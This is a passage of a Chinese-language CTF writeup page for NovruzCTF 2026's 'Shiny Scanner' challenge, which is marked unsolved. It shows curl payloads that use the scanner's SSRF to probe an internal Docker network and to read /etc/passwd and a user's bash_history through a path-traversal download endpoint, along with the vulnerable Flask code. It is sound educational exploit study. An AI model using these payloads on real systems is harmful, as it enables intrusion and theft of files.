@@ -1,0 +1,1598 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="CTF 竞赛解题记录与学习笔记">
+      
+      
+        <meta name="author" content="BIGC CTF Team">
+      
+      
+        <link rel="canonical" href="https://starnotes-xj.github.io/BIGC_CTF_Writeups/Web/NovruzCTF_kecel-scanner/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>NovruzCTF 2026 - Shiny Scanner Writeup [未解出] - BIGC CTF Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra_v3.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#novruzctf-2026-shiny-scanner-writeup" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="BIGC CTF Writeups" class="md-header__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            BIGC CTF Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              NovruzCTF 2026 - Shiny Scanner Writeup [未解出]
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../guides/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  新手指南
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Web
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  密码学
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  逆向工程
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Pwn/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Pwn
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  杂项
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../PPC/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  PPC
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../events/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  比赛
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../history/competitions/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  历史参赛记录
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../tags/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  标签
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  模板
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="BIGC CTF Writeups" class="md-nav__button md-logo" aria-label="BIGC CTF Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 11c0 5.55-3.84 10.74-9 12-5.16-1.26-9-6.45-9-12V5l9-4 9 4zm-9 10c3.75-1 7-5.46 7-9.78V6.3l-7-3.12z"/></svg>
+
+    </a>
+    BIGC CTF Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../guides/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    新手指南
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cryptography%28%E5%AF%86%E7%A0%81%E5%AD%A6%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    密码学
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Reverse%20Engineering%28%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    逆向工程
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Pwn/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pwn
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Misc%28%E6%9D%82%E9%A1%B9%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    杂项
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../PPC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    PPC
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../events/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    比赛
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../history/competitions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    历史参赛记录
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    标签
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../WRITEUP_TEMPLATE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    模板
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        题目信息
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        解题思路
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="解题思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 信息收集
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-ssrf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. SSRF 漏洞确认
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-docker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 内网探测 — 发现 Docker 网络中的文件服务器
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-lfi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. LFI 漏洞 — 任意文件读取
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-bash_history-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 信息泄露 — bash_history 暴露 flag 位置
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 获取 Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        漏洞分析 / 机制分析
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞分析 / 机制分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#go" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Go 版本自动化请求脚本
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        完整网络拓扑
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        未完成的攻击思路
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="未完成的攻击思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-crlf-via-version" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. CRLF 注入 via version 列表类型（最有希望）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-file-scanner" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 通过 file:// 协议读取 Scanner 容器文件
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-novruzlandopenresty" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Novruzland/OpenResty 登录页凭据
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-scanner" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Scanner 源码审计
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        踩过的坑
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="踩过的坑">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#flag-rabbit-hole" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        文件服务器的 flag 是 rabbit hole
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#spa-catch-all-flagtxt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SPA Catch-All 阻止直接访问 /flag.txt
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#crlf-url-headers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CRLF 注入在 URL 和 Headers 中被阻断
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IP 过滤其实没那么严格
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        其他玩家的扫描记录是重要信息源
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        知识点
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gui" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        命令行提取关键数据（无 GUI）
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        推荐工具与优化解题流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="推荐工具与优化解题流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        推荐工具
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        工具对比总结
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        推荐流程
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        脚本归档
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        使用的工具
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="novruzctf-2026-shiny-scanner-writeup">NovruzCTF 2026 - Shiny Scanner Writeup [未解出]<a class="headerlink" href="#novruzctf-2026-shiny-scanner-writeup" title="Permanent link">&para;</a></h1>
+<h2 id="_1">题目信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>比赛</strong>: NovruzCTF 2026</li>
+<li><strong>题目</strong>: Shiny Scanner</li>
+<li><strong>类别</strong>: Web</li>
+<li><strong>难度</strong>: 中等</li>
+<li><strong>附件/URL</strong>: <code>http://95.111.234.103:5050/</code></li>
+<li><strong>题目描述</strong>: kosa 发布了一款先进的互联网扫描产品。我们必须立即阻止他们。捕获 /flag.txt。</li>
+<li><strong>状态</strong>: 未解出（比赛环境已关闭）</li>
+</ul>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>未找到正确 flag
+</code></pre></div>
+<blockquote>
+<p><strong>注意</strong>: 从文件服务器获取的 <code>novruzctf{d1r3ct0ry_tr4v3rs4l_1s_l1k3_m4g1c}</code> 经验证为错误 flag（可能属于其他题目或为 rabbit hole）。</p>
+</blockquote>
+<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><strong>攻击链：SSRF → 内网探测 → 发现文件服务器 → LFI（任意文件读取）→ bash_history 信息泄露 → 读取 flag</strong></p>
+<h3 id="1">1. 信息收集<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<p>访问主页，看到一个 Svelte SPA 前端应用 "Shiny Scanner"。</p>
+<p><strong>API 端点（从前端 JS 提取）：</strong></p>
+<ul>
+<li><code>GET /api/</code> - 返回 <code>{"hello":"world"}</code></li>
+<li><code>POST /api/mine</code> - 创建扫描任务（参数：url, version, headers）</li>
+<li><code>GET /api/mine</code> - 查看所有扫描记录</li>
+<li><code>GET /api/mine/{task_id}</code> - 查看扫描结果</li>
+<li><code>GET /docs</code> - FastAPI Swagger 文档</li>
+<li><code>GET /openapi.json</code> - OpenAPI 规范</li>
+</ul>
+<p><strong>后端技术栈：</strong> Python 3.11 + aiohttp/3.8.5 + uvicorn（FastAPI 框架）</p>
+<h3 id="2-ssrf">2. SSRF 漏洞确认<a class="headerlink" href="#2-ssrf" title="Permanent link">&para;</a></h3>
+<p>扫描器接受 URL 输入并发起服务端 HTTP 请求，存在 SSRF 漏洞：</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://95.111.234.103:5050/api/mine<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;url&quot;:&quot;http://127.0.0.1:5000/api/&quot;,&quot;version&quot;:&quot;1.1&quot;,&quot;headers&quot;:{}}&#39;</span>
+</code></pre></div>
+<p><code>127.0.0.1</code> 未被过滤（<code>dig +short</code> 对 IP 地址返回空字符串，不在黑名单中）。</p>
+<h3 id="3-docker">3. 内网探测 — 发现 Docker 网络中的文件服务器<a class="headerlink" href="#3-docker" title="Permanent link">&para;</a></h3>
+<p>通过查看 <code>/api/mine</code> 中其他玩家的扫描记录，发现了内部 Docker 网络结构：</p>
+<table>
+<thead>
+<tr>
+<th>IP</th>
+<th>端口</th>
+<th>服务</th>
+<th>技术栈</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>172.19.0.2</td>
+<td>5000</td>
+<td>Shiny Scanner 自身</td>
+<td>FastAPI/uvicorn</td>
+</tr>
+<tr>
+<td>172.19.0.4</td>
+<td>80</td>
+<td>Novruzland 登录页</td>
+<td>Go HTTP</td>
+</tr>
+<tr>
+<td>172.19.0.5</td>
+<td>80</td>
+<td>另一个登录页</td>
+<td>OpenResty/Nginx + PHP</td>
+</tr>
+<tr>
+<td><strong>172.19.0.6</strong></td>
+<td><strong>5000</strong></td>
+<td><strong>Flask 文件服务器</strong></td>
+<td><strong>Werkzeug/2.2.3 Python/3.9</strong></td>
+</tr>
+<tr>
+<td>172.17.0.1</td>
+<td>3000</td>
+<td>Ghost Machine Interface</td>
+<td>Express/Node.js</td>
+</tr>
+</tbody>
+</table>
+<p><strong>关键发现：</strong> 文件服务器 <code>172.19.0.6:5000</code> 有一个 <code>/download?file=</code> 端点。</p>
+<h3 id="4-lfi">4. LFI 漏洞 — 任意文件读取<a class="headerlink" href="#4-lfi" title="Permanent link">&para;</a></h3>
+<p>文件服务器的 <code>/download</code> 端点存在路径遍历漏洞。通过 SSRF 请求内部文件服务器：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 测试绝对路径读取</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://95.111.234.103:5050/api/mine<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;url&quot;:&quot;http://172.19.0.6:5000/download?file=/etc/passwd&quot;,&quot;version&quot;:&quot;1.1&quot;,&quot;headers&quot;:{}}&#39;</span>
+</code></pre></div>
+<p>成功读取 <code>/etc/passwd</code>！确认任意文件读取漏洞。</p>
+<p><strong>读取源码确认漏洞根因 (<code>/usr/src/app/app.py</code>)：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="n">FILES_DIR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">root_path</span><span class="p">,</span> <span class="s1">&#39;files&#39;</span><span class="p">)</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/download&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">download</span><span class="p">():</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
+    <span class="c1"># VULNERABILITY: No path traversal protections</span>
+    <span class="n">filepath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">FILES_DIR</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+</code></pre></div>
+<p><code>os.path.join()</code> 在 <code>filename</code> 为绝对路径时直接返回该路径，无任何校验。</p>
+<h3 id="5-bash_history-flag">5. 信息泄露 — bash_history 暴露 flag 位置<a class="headerlink" href="#5-bash_history-flag" title="Permanent link">&para;</a></h3>
+<p><code>/etc/passwd</code> 中发现 <code>system_admin</code> 用户。读取其 bash 历史：</p>
+<div class="highlight"><pre><span></span><code>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://95.111.234.103:5050/api/mine<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
